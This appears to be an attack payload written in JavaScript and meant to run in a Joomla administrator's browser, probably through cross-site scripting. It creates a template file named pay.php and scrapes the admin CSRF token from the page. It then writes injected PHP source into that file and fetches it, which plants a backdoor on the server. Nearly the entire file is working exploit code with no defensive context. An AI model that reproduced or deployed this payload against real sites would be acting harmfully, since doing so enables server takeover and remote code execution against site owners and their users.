function httpGet(theUrl)
{
    var xmlHttp = null;

    xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false );
    xmlHttp.send( null );
    return xmlHttp.responseText;
}

var page = httpGet("%s/administrator/index.php?option=com_templates&view=template&id=507&file=L3BheS5waHA=");

function httpPost(theUrl, csrftoken)
{
    var xmlHttp = null;

    xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "POST", theUrl, false );
    xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    if (csrftoken == "null")
    {
        xmlHttp.send("type=php&name=pay&address=");
    }
    else
    {
        xmlHttp.send("jform[source]=%s&task=template.apply&" + csrftoken + "=1&jform[extension_id]=507&jform[filename]=/pay.php");
    }
    return xmlHttp.responseText;

}

csrftoken = "null";

httpPost("%s/administrator/index.php?option=com_templates&task=template.createFile&id=507&file=L3BheS5waHA=", csrftoken);

//ik I fail at regex fuk u
var regExp = /\/administrator\/index.php\?option=com_login&amp;task=logout&amp;([^)]+)\"/;
var matches = regExp.exec(page);
var csrftoken = matches[1].slice(0, 32);

httpPost("%s/administrator/index.php?option=com_templates&view=template&id=507&file=L3BheS5waHA=", csrftoken);
httpGet("%s/administrator/templates/isis/pay.php");
